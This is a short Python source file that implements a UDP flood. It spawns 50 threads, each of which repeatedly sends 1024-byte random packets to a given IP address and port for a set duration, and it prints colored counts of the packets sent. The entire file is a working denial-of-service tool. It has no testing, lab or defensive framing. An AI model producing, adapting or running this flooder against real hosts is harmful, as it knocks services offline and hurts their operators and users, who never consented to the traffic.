import socket
import threading
import random
import time
from colorama import Fore, Style

def udp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    sent = 0

    def attack():
        nonlocal sent
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)

        while time.time() < timeout:
            try:
                sock.sendto(payload, (target_ip, target_port))
                sent += 1
                print(f"{Fore.MAGENTA}[UDP] Sent packet #{sent} to {target_ip}:{target_port}{Style.RESET_ALL}")
            except Exception:
                pass

    thread_count = 50  # Adjustable threads
    threads = []

    print(f"\n{Fore.YELLOW}[*] Starting UDP Flood on {target_ip}:{target_port} for {duration}s...{Style.RESET_ALL}")
    for _ in range(thread_count):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"{Fore.GREEN}[+] UDP Flood Completed. Packets sent: {sent}{Style.RESET_ALL}")
